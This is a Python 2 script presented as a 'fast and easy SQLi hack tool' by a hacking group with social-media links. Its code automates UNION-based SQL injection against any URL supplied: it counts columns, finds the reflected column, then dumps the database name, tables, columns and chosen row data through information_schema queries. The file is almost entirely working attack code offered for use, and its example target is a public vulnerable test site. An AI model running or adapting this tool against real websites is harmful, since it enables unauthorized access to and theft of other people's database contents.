# Facebook: https://www.facebook.com/TheCybersTeam
# Group:    https://www.facebook.com/groups/TheCybersTeam
# Channel:  https://www.youtube.com/channel/UCKFMv1cifW55lKKps2thhbw
# Greatz:   quintanilhaedu

import urllib as cybers
import sys
import os
import platform

debug = 0

clear = "clear"
if platform.system() == "Windows":
    clear = "cls"
os.system(str(clear))

header="""
  ____ _              ___      _                     _____                      
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                               

More: https://www.facebook.com/TheCybersTeam
Fast and easy SQLi hack tool Beta 1.8
"""
print header

for k, v in enumerate(sys.argv):
    if v == "--url":
        try:
            u = sys.argv[k+1]
            if debug == 1:
                u = "http://testphp.vulnweb.com/listproducts.php?cat=1"
            pos = u.find("=")
            url = u[:pos+1]
        except:
            pass
            
try:
    print "Url: "+u
    print "\n"
except NameError:
    pass
    print "*ERROR*: Url not defined!\n"
    print "Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1\n"
    exit()

build = [url + "-1 union select ", ""]

def getContent(url):
    res = cybers.urlopen(url)
    return res.read()

def status(i):
    sys.stdout.write("\rColumns Total: {0}".format(i))

def countColumns(url):
    key = "Th3Cyb3rsT34m"
    print "Start Count Columns..."
    url = url + "-1 union select "
    start = 1
    finish = 50

    for i in range(start,finish):
        status(i)
        if i != start and i != finish:
            url = url + ", "

        url = url + "'"+key+"'"
        res = getContent(url)

        if res.find(key) !=-1:
            return i
            break
    return 0

try:
    if debug == 1:
        columns = 11
    else:
        columns = countColumns(url)
except:
    pass

def getVulColumns(columns, url):
    key = "Th3Cyb3rsT34m"
    inject = "666Th3Cyb3rsTeam666"
    for i in range(1, columns+1):
        line = "-1 union select "
        for j in range(1, columns+1):
            if j != 1 and j != columns+1:
                line = line + ", "

            if i == j:
                line+="'"+inject+"'"
            else:
                line+="'"+key+"'"

        res = getContent(url + line)
        if res.find(inject) !=-1:
            return i
            break
    return 0

vulCol = getVulColumns(columns,url)
print "\nVul Column: " +str(vulCol)

def getVars(content):
    pos = content.find("'#")
    if(pos != -1):      
        ini = content[pos+2:]
        pos = ini.find("#'")
        return ini[:pos]

def concat(string):
    return "concat(0x27,0x23,group_concat(unhex(hex("+string+"))),0x23,0x27)"

def getDatabase(vulCol,columns,url):
    global build
    line = ""
    side = 0
    for i in range(1, columns+1):
        if i != 1 and i != columns+1:
            line=", "

        if side == 0:
            if i != vulCol:
                build[side]+=line+str(i)
                line+= str(i) 
            else:
                side = 1
        else:
            build[side]+=line+str(i)

    url = build[0] + concat("database()") + build[1]
    res = getContent(url)
    return getVars(res)

class Db:
    name = None
    tables = []
    def setName(self, name):
        self.name = name
    def setTables(self, table):
        self.tables = table

dbs = []
db = Db()
database = getDatabase(vulCol,columns,url)
db.setName(database)
dbs.append(db)

for i in dbs:
    print "Database: " + i.name

def getTables(database,vulCol,columns, url):
    global build
    url = build[0] + concat("table_name") + build[1] + " from+information_schema.tables where table_schema='"+database+"'"
    res = getContent(url)
    return getVars(res)


class Tb:
    name = None
    columns = []
    rows = []
    def setName(self,name):
        self.name = name
    def setColumns(self,columns):
        self.columns = columns
    def setDatas(self,rows):
        self.rows = rows

tbs = []
tables = getTables(database,vulCol,columns, url)
for i in tables.split(","):
    tb = Tb()
    tb.setName(i)
    tbs.append(tb)

dbs[0].setTables(tbs)
print "Tables: "+tables

sys.stdout.write("\nTable: ")
if debug == 1:
    table = "artists"
else:
    table = raw_input()

def getColumns(table,database, volCol, columns, url):
    global build
    url = build[0] + concat("column_name") + build[1] + " from+information_schema.columns where table_name='"+table+"'"
    res = getContent(url)
    return getVars(res)


cols = getColumns(table,database,vulCol,columns, url)
cls = cols.split(",")
dbs[0].tables[0].setColumns(cls)

print "Columns: "+cols

sys.stdout.write("\nColumns names: ")
if debug == 1:
    column = "artist_id,aname"
    print "\n"
else:
    column = raw_input()
cols = column.split(",")

def getData(cols, table,database, volCol, columns, url):
    global build
    line = ""
    i = 0
    title = ""
    space = []

    for name in cols:
        space.append(len(name))
        title+=name+"\t"
        if i !=0:
            line+=",0x3a,"
        line+=name
        i+=1

    url = build[0] + "concat(0x27,0x23,group_concat("+line+"),0x23,0x27)" + build[1]+ " from+"+table
    res = getContent(url)
    data = getVars(res)
    rows = data.split(",")

    vector = []
    for j in rows:
        i=0
        col = j.split(":")
        temp = []
        for k in col:
            temp.append(k)
            if len(k) > space[i]:
                space[i] = len(k)
            i=i+1
        vector.append(temp)
    dbs[0].tables[0].setDatas(vector)
    line = ""
    i=0
    for j in cols:
        line+=j
        for k in range(len(j),space[i]+2):
            line+=" "

    print line

    for j in rows:
        i = 0
        col = j.split(":")
        line=""
        i=0
        for k in col:
            line+=k
            for l in range(len(k),space[i]+2):
                line +=" "
            i=i+1
        print line
getData(cols,table,database,vulCol,columns, url)
